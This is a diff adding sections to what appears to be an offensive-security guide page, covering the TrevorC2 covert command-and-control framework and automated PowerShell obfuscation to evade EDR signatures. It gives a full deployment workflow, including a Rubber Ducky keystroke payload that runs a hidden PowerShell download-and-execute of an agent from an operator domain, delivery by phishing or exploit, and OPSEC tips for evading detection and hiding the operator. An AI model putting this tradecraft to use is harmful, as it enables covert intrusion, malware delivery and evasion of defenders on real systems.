@@ -213,3 +213,92 @@ Copy-Item $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\u
 # ── Bypass 5: JEA (Just Enough Administration) misconfiguration ───────────────
 # If JEA endpoints expose cmdlets that can be chained for RCE:
 Get-PSSessionConfiguration | Where-Object &#123; $_.LanguageMode -ne "NoLanguage" &#125;</code></pre>
+
+  <h2>TrevorC2 — Covert C2 via Website Screenshots</h2>
+  <p>TrevorC2 is a covert command-and-control framework that hides C2 traffic inside legitimate-looking website screenshot data. The server hosts a normal-looking webpage; implants retrieve the page and decode commands steganographically embedded in the content. This makes C2 traffic blend with ordinary web browsing, evading proxy and DLP tools that inspect HTTP/S content for known C2 patterns.</p>
+  <pre><code># TrevorC2 architecture:
+# - Server: Python Flask app that serves a webpage; commands are embedded in the page content
+# - Client: PowerShell agent (agent.ps1) that polls the server URL at an interval,
+#           extracts the hidden command from the page, executes it, and returns output
+#           encoded as a second request that looks like a normal page visit
+# - Channel: plain HTTPS to a legitimate-looking domain — no custom protocol or unusual ports
+
+# Project: github.com/trustedsec/trevorc2</code></pre>
+
+  <h2>Trevorfuscation — Automated PowerShell Obfuscation Workflow</h2>
+  <p>Trevorfuscation is a shell script that automates cloning TrevorC2, installing PyFuscation (a Python-based PowerShell obfuscator), and obfuscating the TrevorC2 PowerShell agent before deployment. PyFuscation replaces function names, variables, and parameters with randomised names, breaking static signatures that EDR products use to flag the known agent.</p>
+
+  <h3>Setup &amp; Usage</h3>
+  <pre><code"># Clone Trevorfuscation:
+git clone https://github.com/mikesmullin/Trevorfuscation
+cd Trevorfuscation
+
+# The script presents a 3-option menu:
+bash trevorfuscation.sh
+
+# Menu options:
+# 1) Download TrevorC2 + PyFuscation
+#    → git clone https://github.com/trustedsec/trevorc2
+#    → git clone https://github.com/CBHue/PyFuscation
+#
+# 2) Install requirements
+#    → pip3 install -r trevorc2/requirements.txt
+#    → pip3 install -r PyFuscation/requirements.txt
+#
+# 3) Obfuscate and start
+#    → runs: python3 PyFuscation/PyFuscation.py -fvp --ps trevorc2/agent.ps1
+#    → outputs: trevorc2/agent_obfuscated.ps1 (renamed functions/vars/params)
+#    → then starts the TrevorC2 server: python3 trevorc2/trevorc2_server.py</code></pre>
+
+  <h3>PyFuscation — Standalone PowerShell Obfuscator</h3>
+  <pre><code"># PyFuscation can obfuscate any PowerShell script — not just TrevorC2.
+# Clone:
+git clone https://github.com/CBHue/PyFuscation
+cd PyFuscation
+pip3 install -r requirements.txt
+
+# Obfuscation flags:
+# -f   obfuscate function names
+# -v   obfuscate variable names
+# -p   obfuscate parameter names
+# --ps [script]  input PS1 file
+
+# Obfuscate your own payload:
+python3 PyFuscation.py -fvp --ps /path/to/payload.ps1
+# Output: /path/to/payload_obfuscated.ps1
+
+# The obfuscated script is functionally identical — all names replaced with
+# randomised strings (e.g., Invoke-Mimikatz → Invoke-aBcDeFgHiJ)
+# Each run produces different output, defeating static hash/signature detection</code></pre>
+
+  <h3>Full Deployment Workflow</h3>
+  <pre><code"># 1. Configure TrevorC2 server (trevorc2/config.py):
+#    SITE_URL = "https://your-domain.com"       # where the agent polls
+#    LISTEN_PORT = 443
+#    POLL_INTERVAL = 60                          # seconds between check-ins
+
+# 2. Obfuscate the agent:
+cd Trevorfuscation
+bash trevorfuscation.sh    # option 1 (download), option 2 (install), option 3 (obfuscate)
+
+# 3. Deliver agent to target:
+#    - HID implant (O.MG Cable / Rubber Ducky):
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass -c "iex (iwr https://your-domain.com/agent.ps1)"
+
+#    - Phishing attachment / macro
+#    - File drop via exploit
+
+# 4. Issue commands from server:
+python3 trevorc2/trevorc2_server.py
+# Type commands at the prompt — they are served embedded in the webpage
+# Agent retrieves the page, decodes the command, executes, returns output
+
+# 5. OPSEC:
+#    - Serve TrevorC2 behind a CDN (Cloudflare) — operator IP hidden
+#    - Domain: register an aged domain with legitimate history
+#    - TLS: use a valid cert (Let's Encrypt) — traffic looks like HTTPS browsing
+#    - Poll interval: 60-300s avoids beaconing anomaly detection
+#    - Obfuscate agent each time before delivery — unique hash per target</code></pre>
